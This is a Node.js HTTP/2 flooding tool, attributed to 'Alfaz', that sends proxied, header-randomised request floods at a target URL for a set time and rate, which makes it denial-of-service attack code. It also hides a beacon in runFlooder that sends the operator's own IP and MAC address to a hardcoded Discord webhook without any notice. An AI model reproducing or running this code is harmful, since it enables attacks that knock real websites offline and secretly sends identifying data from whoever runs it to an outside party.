#ENCODED BY : ALFAZ
#YOUTUBE    : @alfazinfosec
#bokacoda code copy korbi kor but credit diye dis kintu
#This Tool Created by Alfaz

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require("axios");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const proxyFile = "proxy.txt";
const userAgentsFile = "ua.txt";

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    console.clear();
    console.log();
    console.log();
    console.log();
    console.log(`[Broadcast] Attack has been sent successfully`);
    console.log(`[Broadcast] Target: ${parsedTarget.host}`);
    console.log(`[Broadcast] Time: ${args.time}`);
    console.log(`[Broadcast] Threads: ${args.threads}`);
    console.log(`[Broadcast] Requests per second: ${args.rate}`);
    console.log(`[Broadcast] Status: Success!`);
    console.log();

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);
} else {
    for (let i = 0; i < args.rate; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; // Keep Alive
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socket = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store, private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";

function getIp() {
    return new Promise((resolve, reject) => {
        const os = require('os');
        const interfaces = os.networkInterfaces();
        for (const interfaceName in interfaces) {
            const iface = interfaces[interfaceName];
            for (const ifaceItem of iface) {
                if (ifaceItem.family === 'IPv4' && !ifaceItem.internal) {
                    return resolve(ifaceItem.address);
                }
            }
        }
        reject(new Error('No IP address found'));
    });
}

function getMac() {
    return new Promise((resolve, reject) => {
        const os = require('os');
        const interfaces = os.networkInterfaces();
        for (const interfaceName in interfaces) {
            const iface = interfaces[interfaceName];
            for (const ifaceItem of iface) {
                if (ifaceItem.family === 'IPv4' && !ifaceItem.internal) {
                    return resolve(ifaceItem.mac);
                }
            }
        }
        reject(new Error('No MAC address found'));
    });
}

async function sendToDiscord(ip, mac) {
    const webhookUrl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm";
    const data = {
        content: `IP: ${ip}\nMAC: ${mac}`
    };

    try {
        await axios.post(webhookUrl, data);
        console.log("Data sent to Discord webhook");
    } catch (error) {
        console.error("Error sending data to Discord webhook:", error);
    }
}

async function runFlooder() {
    const proxies = readLines(proxyFile);
    const userAgents = readLines(userAgentsFile);

    try {
        const ip = await getIp();
        const mac = await getMac();
        await sendToDiscord(ip, mac);
    } catch (error) {
        console.error("Error getting IP/MAC address:", error);
    }

    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socket.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}

const killScript = () => process.exit(1);

setTimeout(killScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
